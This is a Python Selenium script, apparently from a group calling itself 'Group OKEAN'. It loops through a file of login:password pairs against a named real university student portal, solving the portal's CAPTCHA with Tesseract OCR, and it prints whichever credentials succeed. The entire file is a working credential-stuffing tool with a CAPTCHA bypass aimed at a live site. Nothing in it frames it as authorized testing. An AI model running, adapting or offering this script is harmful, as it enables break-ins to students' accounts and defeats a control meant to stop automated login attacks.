from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from PIL import Image
import pytesseract
import io
import base64
import random
import time
import requests

# Agar Windows bo‘lsangiz, tesseract yo‘lini belgilang (agar kerak bo‘lsa):
# pytesseract.pytesseract.tesseract_cmd = r'C:\Program Files\Tesseract-OCR\tesseract.exe'

def print_colorful_banner():
    colors = ['\033[91m', '\033[92m', '\033[93m', '\033[94m', '\033[95m', '\033[96m', '\033[97m']
    reset = '\033[0m'
    text = "Group OKEAN by vvokhidov "
    print("\n" + "".join(random.choice(colors) + char for char in text) + reset + "\n")

def read_logins(file_path):
    with open(file_path, 'r', encoding='utf-8') as f:
        lines = f.readlines()
    credentials = []
    for line in lines:
        line = line.strip()
        if ':' in line:
            login, password = line.split(':', 1)
            credentials.append((login, password))
    return credentials

def solve_captcha(driver, wait):
    try:
        captcha_img = wait.until(
            EC.presence_of_element_located((By.CSS_SELECTOR, "img.captcha-image"))
        )
        captcha_src = captcha_img.get_attribute("src")

        if "data:image" in captcha_src:
            header, encoded = captcha_src.split(",", 1)
            image_data = base64.b64decode(encoded)
        else:
            response = requests.get(captcha_src)
            image_data = response.content

        image = Image.open(io.BytesIO(image_data)).convert("L")  # Convert to grayscale
        captcha_text = pytesseract.image_to_string(image, config='--psm 8 -c tessedit_char_whitelist=abcdefghijklmnopqrstuvwxyz').strip()
        print(f"[CAPTCHA] Recognized text: {captcha_text}")

        captcha_input = wait.until(
            EC.presence_of_element_located((By.NAME, "captcha"))
        )
        captcha_input.clear()
        captcha_input.send_keys(captcha_text)

    except Exception as e:
        print(f"[CAPTCHA ERROR] {str(e)}")


print_colorful_banner()

driver = webdriver.Chrome()
wait = WebDriverWait(driver, 15)
credentials = read_logins('logins.txt')

for login, password in credentials:
    print(f"Trying login: {login} | password: {password}")
    driver.get("https://hemis.kstu.uz/dashboard/login")
    
    try:
        login_input = wait.until(
            EC.presence_of_element_located((By.NAME, "FormStudentLogin[login]"))
        )
        password_input = wait.until(
            EC.presence_of_element_located((By.NAME, "FormStudentLogin[password]"))
        )
        submit_btn = wait.until(
            EC.element_to_be_clickable((By.CSS_SELECTOR, "button[type='submit']"))
        )
        
        login_input.clear()
        login_input.send_keys(login)
        
        password_input.clear()
        password_input.send_keys(password)

      
        solve_captcha(driver, wait)

        submit_btn.click()
        time.sleep(5)

        current_url = driver.current_url
        print(f"Current URL after submit: {current_url}")
        
        if "login" not in current_url:
            print(f"[SUCCESS] Login: {login} | Password: {password}")
            break
        else:
            print(f"[FAIL] Login: {login} | Password: {password}")
    
    except Exception as e:
        print(f"[ERROR] Login: {login} | Password: {password} | Error: {str(e)}")

driver.quit()


print("\nThis project author is Okean tg:@group_okean okeanelsy@protonmail.com")


